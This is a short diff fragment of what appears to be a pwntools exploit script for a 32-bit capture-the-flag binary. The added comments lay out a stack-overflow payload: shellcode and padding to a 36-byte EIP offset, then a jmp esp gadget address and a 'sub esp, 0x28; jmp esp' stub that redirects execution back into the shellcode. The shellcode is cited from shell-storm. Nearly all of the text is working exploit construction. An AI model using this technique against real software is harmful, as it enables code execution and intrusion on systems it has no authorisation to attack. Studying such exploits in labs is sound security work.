@@ -14,11 +14,15 @@ context.arch = "i386"
 p.recvuntil("What's your name?\n")
 
 # EIP offset = 36
-# payload -> |shellcode|padding|
+# payload -> |shellcode|padding| jmp_esp | sub_esp_jmp |
+# len     -> |        36       |   40    |      44     |
+#                              |   EIP   |      ESP    |
+# BTW, EBP offset = 32
 
 # Gadget
 jmp_esp = 0x08048504
-sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
+# jmp_esp = asm("jmp esp")
+sub_esp_jmp = asm('sub esp, 0x28 ; jmp esp') # sub esp, 40 ; jmp esp
 
 # Shellcode
 # From http://shell-storm.org/shellcode/files/shellcode-827.php
